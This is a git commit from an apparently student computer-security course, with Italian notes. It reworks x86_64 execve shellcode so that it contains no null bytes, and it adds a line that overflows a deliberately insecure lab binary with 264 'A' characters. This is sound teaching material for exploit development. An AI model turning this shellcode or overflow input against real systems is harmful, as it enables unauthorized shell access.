598e60ba24254b482d0d228b2abd28474751f173
Giovanni Santini <giovannisantini93@yahoo.it>
2016-11-02 11:11:47 +0100

    Remove zeroes from the binary code... Make it great again

--- computer_security/lesson_5/candy_shell_64.s
+++ computer_security/lesson_5/candy_shell_64.s
@@ -8,14 +8,16 @@ _start:
 	jmp reset_label
 # The real code...
 real_code:
-	movq $0, %rdx # Third argument: pointer to NULL
-	movq $0, %rsi # Second argument: pointer to message
-	movq $sh, %rdi # First argument: pointer to filename
-	movq $59, %rax # execve syscall number
+	pop	%rdi		# Get the shell string by popping the stack
+	xorq	%rdx, %rdx 	# Third argument: pointer to NULL
+	xorq	%rsi, %rsi 	# Second argument: pointer to message
+	# Avoided with the 'pop' above
+	#movq	$sh, %rdi 	# First argument: pointer to filename
+	movb	$59, %al 	# execve syscall number
 	syscall
 	# After the shell, exit
-	movq $0, %rbx
-	movq $1, %rax
+	xorq %rbx, %rbx
+	movb $1, %al
 	syscall
 # Make it position independent, step 2!
 reset_label:
--- computer_security/lesson_5/notes.md
+++ computer_security/lesson_5/notes.md
@@ -1,3 +1,15 @@
 # Differenze tra x86 e x86_64
 syscall code: 59
 Registri diversi per caricare le syscalls
+
+# Nyan derp
+./ex_5.9_insecure $(perl -e 'print "A"x264') <- da provare lol
+
+# Note nella conversione
+In quanto usiamo stringe, dobbiamo evitare \x00 che è terminatore
+Quindi modifichiamo il codice per non averne
+Tipo
+movq $0, %reg -> xorq %reg, %reg  # Evitiamo zeri resettando i registri
+movq $int, %rax -> movb $int, %al # Spostiamo bytes
+Ed inoltre, per caricare la stringa di eseguibile
+pop %rdi -> la stringa del comando da eseguire è sullo stack, quindi faccio la pop diretta
